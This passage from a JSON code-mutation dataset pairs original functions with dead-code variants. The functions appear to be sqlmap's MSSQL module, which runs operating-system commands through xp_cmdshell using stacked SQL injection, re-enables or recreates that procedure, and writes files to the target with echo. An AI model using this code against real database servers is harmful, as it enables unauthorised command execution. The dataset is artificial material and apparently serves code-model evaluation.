            "def xpCmdshellWriteFile(self, fileContent, tmpPath, randDestFile):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    echoedLines = []\n    cmd = ''\n    charCounter = 0\n    maxLen = 512\n    if isinstance(fileContent, (set, list, tuple)):\n        lines = fileContent\n    else:\n        lines = fileContent.split('\\n')\n    for line in lines:\n        echoedLine = 'echo %s ' % line\n        echoedLine += '>> \"%s\\\\%s\"' % (tmpPath, randDestFile)\n        echoedLines.append(echoedLine)\n    for echoedLine in echoedLines:\n        cmd += '%s & ' % echoedLine\n        charCounter += len(echoedLine)\n        if charCounter >= maxLen:\n            self.xpCmdshellExecCmd(cmd.rstrip(' & '))\n            cmd = ''\n            charCounter = 0\n    if cmd:\n        self.xpCmdshellExecCmd(cmd.rstrip(' & '))"
        ]
    },
    {
        "func_name": "xpCmdshellForgeCmd",
        "original": "def xpCmdshellForgeCmd(self, cmd, insertIntoTable=None):\n    if conf.dbmsCred and insertIntoTable:\n        self.tmpFile = '%s/tmpc%s.txt' % (conf.tmpPath, randomStr(lowercase=True))\n        cmd = '%s > \"%s\"' % (cmd, self.tmpFile)\n    self._randStr = randomStr(lowercase=True)\n    self._forgedCmd = 'DECLARE @%s VARCHAR(8000);' % self._randStr\n    try:\n        self._forgedCmd += 'SET @%s=%s;' % (self._randStr, '0x%s' % encodeHex(cmd, binary=False))\n    except UnicodeError:\n        self._forgedCmd += \"SET @%s='%s';\" % (self._randStr, cmd)\n    if insertIntoTable and (not conf.dbmsCred):\n        self._forgedCmd += 'INSERT INTO %s(data) ' % insertIntoTable\n    self._forgedCmd += 'EXEC %s @%s' % (self.xpCmdshellStr, self._randStr)\n    return agent.runAsDBMSUser(self._forgedCmd)",
        "mutated": [
            "def xpCmdshellForgeCmd(self, cmd, insertIntoTable=None):\n    if False:\n        i = 10\n    if conf.dbmsCred and insertIntoTable:\n        self.tmpFile = '%s/tmpc%s.txt' % (conf.tmpPath, randomStr(lowercase=True))\n        cmd = '%s > \"%s\"' % (cmd, self.tmpFile)\n    self._randStr = randomStr(lowercase=True)\n    self._forgedCmd = 'DECLARE @%s VARCHAR(8000);' % self._randStr\n    try:\n        self._forgedCmd += 'SET @%s=%s;' % (self._randStr, '0x%s' % encodeHex(cmd, binary=False))\n    except UnicodeError:\n        self._forgedCmd += \"SET @%s='%s';\" % (self._randStr, cmd)\n    if insertIntoTable and (not conf.dbmsCred):\n        self._forgedCmd += 'INSERT INTO %s(data) ' % insertIntoTable\n    self._forgedCmd += 'EXEC %s @%s' % (self.xpCmdshellStr, self._randStr)\n    return agent.runAsDBMSUser(self._forgedCmd)",
            "def xpCmdshellForgeCmd(self, cmd, insertIntoTable=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if conf.dbmsCred and insertIntoTable:\n        self.tmpFile = '%s/tmpc%s.txt' % (conf.tmpPath, randomStr(lowercase=True))\n        cmd = '%s > \"%s\"' % (cmd, self.tmpFile)\n    self._randStr = randomStr(lowercase=True)\n    self._forgedCmd = 'DECLARE @%s VARCHAR(8000);' % self._randStr\n    try:\n        self._forgedCmd += 'SET @%s=%s;' % (self._randStr, '0x%s' % encodeHex(cmd, binary=False))\n    except UnicodeError:\n        self._forgedCmd += \"SET @%s='%s';\" % (self._randStr, cmd)\n    if insertIntoTable and (not conf.dbmsCred):\n        self._forgedCmd += 'INSERT INTO %s(data) ' % insertIntoTable\n    self._forgedCmd += 'EXEC %s @%s' % (self.xpCmdshellStr, self._randStr)\n    return agent.runAsDBMSUser(self._forgedCmd)",
            "def xpCmdshellForgeCmd(self, cmd, insertIntoTable=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if conf.dbmsCred and insertIntoTable:\n        self.tmpFile = '%s/tmpc%s.txt' % (conf.tmpPath, randomStr(lowercase=True))\n        cmd = '%s > \"%s\"' % (cmd, self.tmpFile)\n    self._randStr = randomStr(lowercase=True)\n    self._forgedCmd = 'DECLARE @%s VARCHAR(8000);' % self._randStr\n    try:\n        self._forgedCmd += 'SET @%s=%s;' % (self._randStr, '0x%s' % encodeHex(cmd, binary=False))\n    except UnicodeError:\n        self._forgedCmd += \"SET @%s='%s';\" % (self._randStr, cmd)\n    if insertIntoTable and (not conf.dbmsCred):\n        self._forgedCmd += 'INSERT INTO %s(data) ' % insertIntoTable\n    self._forgedCmd += 'EXEC %s @%s' % (self.xpCmdshellStr, self._randStr)\n    return agent.runAsDBMSUser(self._forgedCmd)",
            "def xpCmdshellForgeCmd(self, cmd, insertIntoTable=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if conf.dbmsCred and insertIntoTable:\n        self.tmpFile = '%s/tmpc%s.txt' % (conf.tmpPath, randomStr(lowercase=True))\n        cmd = '%s > \"%s\"' % (cmd, self.tmpFile)\n    self._randStr = randomStr(lowercase=True)\n    self._forgedCmd = 'DECLARE @%s VARCHAR(8000);' % self._randStr\n    try:\n        self._forgedCmd += 'SET @%s=%s;' % (self._randStr, '0x%s' % encodeHex(cmd, binary=False))\n    except UnicodeError:\n        self._forgedCmd += \"SET @%s='%s';\" % (self._randStr, cmd)\n    if insertIntoTable and (not conf.dbmsCred):\n        self._forgedCmd += 'INSERT INTO %s(data) ' % insertIntoTable\n    self._forgedCmd += 'EXEC %s @%s' % (self.xpCmdshellStr, self._randStr)\n    return agent.runAsDBMSUser(self._forgedCmd)",
            "def xpCmdshellForgeCmd(self, cmd, insertIntoTable=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if conf.dbmsCred and insertIntoTable:\n        self.tmpFile = '%s/tmpc%s.txt' % (conf.tmpPath, randomStr(lowercase=True))\n        cmd = '%s > \"%s\"' % (cmd, self.tmpFile)\n    self._randStr = randomStr(lowercase=True)\n    self._forgedCmd = 'DECLARE @%s VARCHAR(8000);' % self._randStr\n    try:\n        self._forgedCmd += 'SET @%s=%s;' % (self._randStr, '0x%s' % encodeHex(cmd, binary=False))\n    except UnicodeError:\n        self._forgedCmd += \"SET @%s='%s';\" % (self._randStr, cmd)\n    if insertIntoTable and (not conf.dbmsCred):\n        self._forgedCmd += 'INSERT INTO %s(data) ' % insertIntoTable\n    self._forgedCmd += 'EXEC %s @%s' % (self.xpCmdshellStr, self._randStr)\n    return agent.runAsDBMSUser(self._forgedCmd)"
        ]
    },
    {
        "func_name": "xpCmdshellExecCmd",
        "original": "def xpCmdshellExecCmd(self, cmd, silent=False):\n    return inject.goStacked(self.xpCmdshellForgeCmd(cmd), silent)",
        "mutated": [
            "def xpCmdshellExecCmd(self, cmd, silent=False):\n    if False:\n        i = 10\n    return inject.goStacked(self.xpCmdshellForgeCmd(cmd), silent)",
            "def xpCmdshellExecCmd(self, cmd, silent=False):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    return inject.goStacked(self.xpCmdshellForgeCmd(cmd), silent)",
            "def xpCmdshellExecCmd(self, cmd, silent=False):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    return inject.goStacked(self.xpCmdshellForgeCmd(cmd), silent)",
            "def xpCmdshellExecCmd(self, cmd, silent=False):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    return inject.goStacked(self.xpCmdshellForgeCmd(cmd), silent)",
            "def xpCmdshellExecCmd(self, cmd, silent=False):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    return inject.goStacked(self.xpCmdshellForgeCmd(cmd), silent)"
        ]
    },
    {
        "func_name": "xpCmdshellEvalCmd",
        "original": "def xpCmdshellEvalCmd(self, cmd, first=None, last=None):\n    output = None\n    if conf.direct:\n        output = self.xpCmdshellExecCmd(cmd)\n        if output and isinstance(output, (list, tuple)):\n            new_output = ''\n            for line in output:\n                if line == 'NULL':\n                    new_output += '\\n'\n                else:\n                    new_output += '%s\\n' % line.strip('\\r')\n            output = new_output\n    else:\n        inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))\n        if conf.dbmsCred:\n            inject.goStacked(\"BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')\" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))\n            self.delRemoteFile(self.tmpFile)\n        query = 'SELECT %s FROM %s ORDER BY id' % (self.tblField, self.cmdTblName)\n        if any((isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY))) or conf.direct:\n            output = inject.getValue(query, resumeValue=False, blind=False, time=False)\n        if output is None or len(output) == 0 or output[0] is None:\n            output = []\n            count = inject.getValue('SELECT COUNT(id) FROM %s' % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n            if isNumPosStrValue(count):\n                for index in getLimitRange(count):\n                    query = agent.limitQuery(index, query, self.tblField)\n                    output.append(inject.getValue(query, union=False, error=False, resumeValue=False))\n        inject.goStacked('DELETE FROM %s' % self.cmdTblName)\n        if output and isListLike(output) and (len(output) > 1):\n            _ = ''\n            lines = [line for line in flattenValue(output) if line is not None]\n            for i in xrange(len(lines)):\n                line = lines[i] or ''\n                if line is None or (i in (0, len(lines) - 1) and (not line.strip())):\n                    continue\n                _ += '%s\\n' % line\n            output = _.rstrip('\\n')\n    return output",
        "mutated": [
            "def xpCmdshellEvalCmd(self, cmd, first=None, last=None):\n    if False:\n        i = 10\n    output = None\n    if conf.direct:\n        output = self.xpCmdshellExecCmd(cmd)\n        if output and isinstance(output, (list, tuple)):\n            new_output = ''\n            for line in output:\n                if line == 'NULL':\n                    new_output += '\\n'\n                else:\n                    new_output += '%s\\n' % line.strip('\\r')\n            output = new_output\n    else:\n        inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))\n        if conf.dbmsCred:\n            inject.goStacked(\"BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')\" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))\n            self.delRemoteFile(self.tmpFile)\n        query = 'SELECT %s FROM %s ORDER BY id' % (self.tblField, self.cmdTblName)\n        if any((isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY))) or conf.direct:\n            output = inject.getValue(query, resumeValue=False, blind=False, time=False)\n        if output is None or len(output) == 0 or output[0] is None:\n            output = []\n            count = inject.getValue('SELECT COUNT(id) FROM %s' % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n            if isNumPosStrValue(count):\n                for index in getLimitRange(count):\n                    query = agent.limitQuery(index, query, self.tblField)\n                    output.append(inject.getValue(query, union=False, error=False, resumeValue=False))\n        inject.goStacked('DELETE FROM %s' % self.cmdTblName)\n        if output and isListLike(output) and (len(output) > 1):\n            _ = ''\n            lines = [line for line in flattenValue(output) if line is not None]\n            for i in xrange(len(lines)):\n                line = lines[i] or ''\n                if line is None or (i in (0, len(lines) - 1) and (not line.strip())):\n                    continue\n                _ += '%s\\n' % line\n            output = _.rstrip('\\n')\n    return output",
            "def xpCmdshellEvalCmd(self, cmd, first=None, last=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    output = None\n    if conf.direct:\n        output = self.xpCmdshellExecCmd(cmd)\n        if output and isinstance(output, (list, tuple)):\n            new_output = ''\n            for line in output:\n                if line == 'NULL':\n                    new_output += '\\n'\n                else:\n                    new_output += '%s\\n' % line.strip('\\r')\n            output = new_output\n    else:\n        inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))\n        if conf.dbmsCred:\n            inject.goStacked(\"BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')\" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))\n            self.delRemoteFile(self.tmpFile)\n        query = 'SELECT %s FROM %s ORDER BY id' % (self.tblField, self.cmdTblName)\n        if any((isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY))) or conf.direct:\n            output = inject.getValue(query, resumeValue=False, blind=False, time=False)\n        if output is None or len(output) == 0 or output[0] is None:\n            output = []\n            count = inject.getValue('SELECT COUNT(id) FROM %s' % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n            if isNumPosStrValue(count):\n                for index in getLimitRange(count):\n                    query = agent.limitQuery(index, query, self.tblField)\n                    output.append(inject.getValue(query, union=False, error=False, resumeValue=False))\n        inject.goStacked('DELETE FROM %s' % self.cmdTblName)\n        if output and isListLike(output) and (len(output) > 1):\n            _ = ''\n            lines = [line for line in flattenValue(output) if line is not None]\n            for i in xrange(len(lines)):\n                line = lines[i] or ''\n                if line is None or (i in (0, len(lines) - 1) and (not line.strip())):\n                    continue\n                _ += '%s\\n' % line\n            output = _.rstrip('\\n')\n    return output",
            "def xpCmdshellEvalCmd(self, cmd, first=None, last=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    output = None\n    if conf.direct:\n        output = self.xpCmdshellExecCmd(cmd)\n        if output and isinstance(output, (list, tuple)):\n            new_output = ''\n            for line in output:\n                if line == 'NULL':\n                    new_output += '\\n'\n                else:\n                    new_output += '%s\\n' % line.strip('\\r')\n            output = new_output\n    else:\n        inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))\n        if conf.dbmsCred:\n            inject.goStacked(\"BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')\" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))\n            self.delRemoteFile(self.tmpFile)\n        query = 'SELECT %s FROM %s ORDER BY id' % (self.tblField, self.cmdTblName)\n        if any((isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY))) or conf.direct:\n            output = inject.getValue(query, resumeValue=False, blind=False, time=False)\n        if output is None or len(output) == 0 or output[0] is None:\n            output = []\n            count = inject.getValue('SELECT COUNT(id) FROM %s' % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n            if isNumPosStrValue(count):\n                for index in getLimitRange(count):\n                    query = agent.limitQuery(index, query, self.tblField)\n                    output.append(inject.getValue(query, union=False, error=False, resumeValue=False))\n        inject.goStacked('DELETE FROM %s' % self.cmdTblName)\n        if output and isListLike(output) and (len(output) > 1):\n            _ = ''\n            lines = [line for line in flattenValue(output) if line is not None]\n            for i in xrange(len(lines)):\n                line = lines[i] or ''\n                if line is None or (i in (0, len(lines) - 1) and (not line.strip())):\n                    continue\n                _ += '%s\\n' % line\n            output = _.rstrip('\\n')\n    return output",
            "def xpCmdshellEvalCmd(self, cmd, first=None, last=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    output = None\n    if conf.direct:\n        output = self.xpCmdshellExecCmd(cmd)\n        if output and isinstance(output, (list, tuple)):\n            new_output = ''\n            for line in output:\n                if line == 'NULL':\n                    new_output += '\\n'\n                else:\n                    new_output += '%s\\n' % line.strip('\\r')\n            output = new_output\n    else:\n        inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))\n        if conf.dbmsCred:\n            inject.goStacked(\"BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')\" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))\n            self.delRemoteFile(self.tmpFile)\n        query = 'SELECT %s FROM %s ORDER BY id' % (self.tblField, self.cmdTblName)\n        if any((isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY))) or conf.direct:\n            output = inject.getValue(query, resumeValue=False, blind=False, time=False)\n        if output is None or len(output) == 0 or output[0] is None:\n            output = []\n            count = inject.getValue('SELECT COUNT(id) FROM %s' % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n            if isNumPosStrValue(count):\n                for index in getLimitRange(count):\n                    query = agent.limitQuery(index, query, self.tblField)\n                    output.append(inject.getValue(query, union=False, error=False, resumeValue=False))\n        inject.goStacked('DELETE FROM %s' % self.cmdTblName)\n        if output and isListLike(output) and (len(output) > 1):\n            _ = ''\n            lines = [line for line in flattenValue(output) if line is not None]\n            for i in xrange(len(lines)):\n                line = lines[i] or ''\n                if line is None or (i in (0, len(lines) - 1) and (not line.strip())):\n                    continue\n                _ += '%s\\n' % line\n            output = _.rstrip('\\n')\n    return output",
            "def xpCmdshellEvalCmd(self, cmd, first=None, last=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    output = None\n    if conf.direct:\n        output = self.xpCmdshellExecCmd(cmd)\n        if output and isinstance(output, (list, tuple)):\n            new_output = ''\n            for line in output:\n                if line == 'NULL':\n                    new_output += '\\n'\n                else:\n                    new_output += '%s\\n' % line.strip('\\r')\n            output = new_output\n    else:\n        inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))\n        if conf.dbmsCred:\n            inject.goStacked(\"BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')\" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))\n            self.delRemoteFile(self.tmpFile)\n        query = 'SELECT %s FROM %s ORDER BY id' % (self.tblField, self.cmdTblName)\n        if any((isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY))) or conf.direct:\n            output = inject.getValue(query, resumeValue=False, blind=False, time=False)\n        if output is None or len(output) == 0 or output[0] is None:\n            output = []\n            count = inject.getValue('SELECT COUNT(id) FROM %s' % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n            if isNumPosStrValue(count):\n                for index in getLimitRange(count):\n                    query = agent.limitQuery(index, query, self.tblField)\n                    output.append(inject.getValue(query, union=False, error=False, resumeValue=False))\n        inject.goStacked('DELETE FROM %s' % self.cmdTblName)\n        if output and isListLike(output) and (len(output) > 1):\n            _ = ''\n            lines = [line for line in flattenValue(output) if line is not None]\n            for i in xrange(len(lines)):\n                line = lines[i] or ''\n                if line is None or (i in (0, len(lines) - 1) and (not line.strip())):\n                    continue\n                _ += '%s\\n' % line\n            output = _.rstrip('\\n')\n    return output"
        ]
    },
    {
        "func_name": "xpCmdshellInit",
        "original": "def xpCmdshellInit(self):\n    if not kb.xpCmdshellAvailable:\n        infoMsg = 'checking if xp_cmdshell extended procedure is '\n        infoMsg += 'available, please wait..'\n        logger.info(infoMsg)\n        result = self._xpCmdshellCheck()\n        if result:\n            logger.info('xp_cmdshell extended procedure is available')\n            kb.xpCmdshellAvailable = True\n        else:\n            message = 'xp_cmdshell extended procedure does not seem to '\n            message += 'be available. Do you want sqlmap to try to '\n            message += 're-enable it? [Y/n] '\n            if readInput(message, default='Y', boolean=True):\n                self._xpCmdshellConfigure(1)\n                if self._xpCmdshellCheck():\n                    logger.info('xp_cmdshell re-enabled successfully')\n                    kb.xpCmdshellAvailable = True\n                else:\n                    logger.warning('xp_cmdshell re-enabling failed')\n                    logger.info('creating xp_cmdshell with sp_OACreate')\n                    self._xpCmdshellConfigure(0)\n                    self._xpCmdshellCreate()\n                    if self._xpCmdshellCheck():\n                        logger.info('xp_cmdshell created successfully')\n                        kb.xpCmdshellAvailable = True\n                    else:\n                        warnMsg = 'xp_cmdshell creation failed, probably '\n                        warnMsg += 'because sp_OACreate is disabled'\n                        logger.warning(warnMsg)\n        hashDBWrite(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE, kb.xpCmdshellAvailable)\n        if not kb.xpCmdshellAvailable:\n            errMsg = 'unable to proceed without xp_cmdshell'\n            raise SqlmapUnsupportedFeatureException(errMsg)\n    debugMsg = 'creating a support table to write commands standard '\n    debugMsg += 'output to'\n    logger.debug(debugMsg)\n    self.createSupportTbl(self.cmdTblName, self.tblField, 'NVARCHAR(4000)')\n    self._xpCmdshellTest()",
        "mutated": [
            "def xpCmdshellInit(self):\n    if False:\n        i = 10\n    if not kb.xpCmdshellAvailable:\n        infoMsg = 'checking if xp_cmdshell extended procedure is '\n        infoMsg += 'available, please wait..'\n        logger.info(infoMsg)\n        result = self._xpCmdshellCheck()\n        if result:\n            logger.info('xp_cmdshell extended procedure is available')\n            kb.xpCmdshellAvailable = True\n        else:\n            message = 'xp_cmdshell extended procedure does not seem to '\n            message += 'be available. Do you want sqlmap to try to '\n            message += 're-enable it? [Y/n] '\n            if readInput(message, default='Y', boolean=True):\n                self._xpCmdshellConfigure(1)\n                if self._xpCmdshellCheck():\n                    logger.info('xp_cmdshell re-enabled successfully')\n                    kb.xpCmdshellAvailable = True\n                else:\n                    logger.warning('xp_cmdshell re-enabling failed')\n                    logger.info('creating xp_cmdshell with sp_OACreate')\n                    self._xpCmdshellConfigure(0)\n                    self._xpCmdshellCreate()\n                    if self._xpCmdshellCheck():\n                        logger.info('xp_cmdshell created successfully')\n                        kb.xpCmdshellAvailable = True\n                    else:\n                        warnMsg = 'xp_cmdshell creation failed, probably '\n                        warnMsg += 'because sp_OACreate is disabled'\n                        logger.warning(warnMsg)\n        hashDBWrite(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE, kb.xpCmdshellAvailable)\n        if not kb.xpCmdshellAvailable:\n            errMsg = 'unable to proceed without xp_cmdshell'\n            raise SqlmapUnsupportedFeatureException(errMsg)\n    debugMsg = 'creating a support table to write commands standard '\n    debugMsg += 'output to'\n    logger.debug(debugMsg)\n    self.createSupportTbl(self.cmdTblName, self.tblField, 'NVARCHAR(4000)')\n    self._xpCmdshellTest()",
            "def xpCmdshellInit(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if not kb.xpCmdshellAvailable:\n        infoMsg = 'checking if xp_cmdshell extended procedure is '\n        infoMsg += 'available, please wait..'\n        logger.info(infoMsg)\n        result = self._xpCmdshellCheck()\n        if result:\n            logger.info('xp_cmdshell extended procedure is available')\n            kb.xpCmdshellAvailable = True\n        else:\n            message = 'xp_cmdshell extended procedure does not seem to '\n            message += 'be available. Do you want sqlmap to try to '\n            message += 're-enable it? [Y/n] '\n            if readInput(message, default='Y', boolean=True):\n                self._xpCmdshellConfigure(1)\n                if self._xpCmdshellCheck():\n                    logger.info('xp_cmdshell re-enabled successfully')\n                    kb.xpCmdshellAvailable = True\n                else:\n                    logger.warning('xp_cmdshell re-enabling failed')\n                    logger.info('creating xp_cmdshell with sp_OACreate')\n                    self._xpCmdshellConfigure(0)\n                    self._xpCmdshellCreate()\n                    if self._xpCmdshellCheck():\n                        logger.info('xp_cmdshell created successfully')\n                        kb.xpCmdshellAvailable = True\n                    else:\n                        warnMsg = 'xp_cmdshell creation failed, probably '\n                        warnMsg += 'because sp_OACreate is disabled'\n                        logger.warning(warnMsg)\n        hashDBWrite(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE, kb.xpCmdshellAvailable)\n        if not kb.xpCmdshellAvailable:\n            errMsg = 'unable to proceed without xp_cmdshell'\n            raise SqlmapUnsupportedFeatureException(errMsg)\n    debugMsg = 'creating a support table to write commands standard '\n    debugMsg += 'output to'\n    logger.debug(debugMsg)\n    self.createSupportTbl(self.cmdTblName, self.tblField, 'NVARCHAR(4000)')\n    self._xpCmdshellTest()",
            "def xpCmdshellInit(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if not kb.xpCmdshellAvailable:\n        infoMsg = 'checking if xp_cmdshell extended procedure is '\n        infoMsg += 'available, please wait..'\n        logger.info(infoMsg)\n        result = self._xpCmdshellCheck()\n        if result:\n            logger.info('xp_cmdshell extended procedure is available')\n            kb.xpCmdshellAvailable = True\n        else:\n            message = 'xp_cmdshell extended procedure does not seem to '\n            message += 'be available. Do you want sqlmap to try to '\n            message += 're-enable it? [Y/n] '\n            if readInput(message, default='Y', boolean=True):\n                self._xpCmdshellConfigure(1)\n                if self._xpCmdshellCheck():\n                    logger.info('xp_cmdshell re-enabled successfully')\n                    kb.xpCmdshellAvailable = True\n                else:\n                    logger.warning('xp_cmdshell re-enabling failed')\n                    logger.info('creating xp_cmdshell with sp_OACreate')\n                    self._xpCmdshellConfigure(0)\n                    self._xpCmdshellCreate()\n                    if self._xpCmdshellCheck():\n                        logger.info('xp_cmdshell created successfully')\n                        kb.xpCmdshellAvailable = True\n                    else:\n                        warnMsg = 'xp_cmdshell creation failed, probably '\n                        warnMsg += 'because sp_OACreate is disabled'\n                        logger.warning(warnMsg)\n        hashDBWrite(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE, kb.xpCmdshellAvailable)\n        if not kb.xpCmdshellAvailable:\n            errMsg = 'unable to proceed without xp_cmdshell'\n            raise SqlmapUnsupportedFeatureException(errMsg)\n    debugMsg = 'creating a support table to write commands standard '\n    debugMsg += 'output to'\n    logger.debug(debugMsg)\n    self.createSupportTbl(self.cmdTblName, self.tblField, 'NVARCHAR(4000)')\n    self._xpCmdshellTest()",
            "def xpCmdshellInit(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if not kb.xpCmdshellAvailable:\n        infoMsg = 'checking if xp_cmdshell extended procedure is '\n        infoMsg += 'available, please wait..'\n        logger.info(infoMsg)\n        result = self._xpCmdshellCheck()\n        if result:\n            logger.info('xp_cmdshell extended procedure is available')\n            kb.xpCmdshellAvailable = True\n        else:\n            message = 'xp_cmdshell extended procedure does not seem to '\n            message += 'be available. Do you want sqlmap to try to '\n            message += 're-enable it? [Y/n] '\n            if readInput(message, default='Y', boolean=True):\n                self._xpCmdshellConfigure(1)\n                if self._xpCmdshellCheck():\n                    logger.info('xp_cmdshell re-enabled successfully')\n                    kb.xpCmdshellAvailable = True\n                else:\n                    logger.warning('xp_cmdshell re-enabling failed')\n                    logger.info('creating xp_cmdshell with sp_OACreate')\n                    self._xpCmdshellConfigure(0)\n                    self._xpCmdshellCreate()\n                    if self._xpCmdshellCheck():\n                        